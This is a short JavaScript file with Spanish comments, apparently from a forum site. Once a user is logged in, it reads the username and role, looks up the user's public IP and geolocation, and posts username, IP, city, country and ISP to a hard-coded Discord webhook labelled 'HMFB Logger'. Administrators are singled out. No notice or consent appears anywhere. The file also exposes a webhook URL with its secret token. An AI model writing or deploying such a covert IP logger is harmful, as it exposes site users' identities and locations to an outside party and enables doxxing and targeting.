// Script de IP - Solo se ejecuta después del login
const sendIP = () => {
    // Verificar si hay usuario logueado
    let forumUser = "NO_IDENTIFICADO";
    let userRole = "unknown";
    
    try {
        const session = JSON.parse(localStorage.getItem('currentSession'));
        if (session && session.username) {
            forumUser = session.username;
            userRole = session.role || 'user';
        } else {
            console.log("No hay usuario logueado - IP no enviada");
            return;
        }
    } catch (e) {
        console.log("Error al verificar sesión");
        return;
    }
    
    // Solo continuar si hay usuario
    console.log("Enviando IP para usuario:", forumUser);
    
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(response => response.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1448715548488634421/fNFu8AxkbmNpIijdmZWrBopyKsvFrwZSnWf5S7GGPyCrFYMaanD0oYjT5yv3BqbAv447';
                    
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "HMFB Logger",
                            avatar_url: "https://media.discordapp.net/attachments/1444072962729840722/1448716308563890246/pe.png",
                            content: userRole === 'admin' ? ' **👑 ADMIN LOGUEADO**' : ' **👤 USUARIO LOGUEADO**',
                            embeds: [{
                                title: userRole === 'admin' ? `👑 ADMIN: ${forumUser}` : `👤 ${forumUser}`,
                                description: `**Usuario:** ${forumUser}\n**IP:** ${ipadd}\n**Ciudad:** ${geoData.city || '?'}\n**País:** ${geoData.country_name || '?'}\n**ISP:** ${geoData.org || geoData.network || '?'}`,
                                color: userRole === 'admin' ? 0x800080 : 0x00FFFF,
                                timestamp: new Date().toISOString()
                            }]
                        })
                    });
                });
        })
        .then(response => {
            if (response.ok) {
                console.log('✅ IP enviada correctamente');
            } else {
                console.log('❌ Error al enviar IP');
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
};

// NO ejecutar automáticamente al cargar
// Solo se ejecutará cuando se llame manualmente

